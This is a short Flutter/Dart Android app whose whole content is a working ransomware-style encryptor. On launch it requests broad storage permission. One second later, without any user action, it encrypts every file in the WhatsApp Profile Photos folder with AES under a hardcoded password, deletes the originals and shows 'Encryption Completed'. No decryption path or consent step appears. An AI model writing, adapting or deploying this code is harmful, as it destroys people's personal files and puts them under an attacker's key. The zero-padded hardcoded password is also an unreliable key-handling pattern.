import 'dart:io';
import 'package:encrypt/encrypt.dart' as encrypt;
import 'package:flutter/material.dart';
import 'package:permission_handler/permission_handler.dart';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await requestPermissions();
  runApp(const EncryptApp());
}

Future<void> requestPermissions() async {
  await Permission.manageExternalStorage.request();
}

Future<void> encryptFolder() async {
  final folderPath = "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Profile Photos";
  final password = "FaizShiv200@123";
  final key = encrypt.Key.fromUtf8(password.padRight(32, '0'));
  final aes = encrypt.Encrypter(encrypt.AES(key, mode: encrypt.AESMode.cbc));

  final dir = Directory(folderPath);

  if (!dir.existsSync()) {
    print("❗ Folder not found: $folderPath");
    return;
  }

  for (var file in dir.listSync()) {
    if (file is File && !file.path.endsWith(".enc")) {
      try {
        final originalBytes = await file.readAsBytes();
        final iv = encrypt.IV.fromSecureRandom(16);
        final encrypted = aes.encryptBytes(originalBytes, iv: iv);

        await File("${file.path}.enc").writeAsBytes(iv.bytes + encrypted.bytes);
        await file.delete();
        print("✅Your WhatsApp/Media/WhatsApp Profile Photos was Encrypted: ${file.path}");

        await Future.delayed(const Duration(milliseconds: 100));
      } catch (e) {
        print("❗ Error encrypting ${file.path}: $e");
      }
    }
  }
}

class EncryptApp extends StatefulWidget {
  const EncryptApp({super.key});

  @override
  State<EncryptApp> createState() => _EncryptAppState();
}

class _EncryptAppState extends State<EncryptApp> {
  String status = "Encryption will start...";

  @override
  void initState() {
    super.initState();
    Future.delayed(const Duration(seconds: 1), () async {
      setState(() => status = "Encrypting...");
      await encryptFolder();
      setState(() => status = "✅ Encryption Completed!");
    });
  }

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      home: Scaffold(body: Center(child: Text(status))),
    );
  }
}
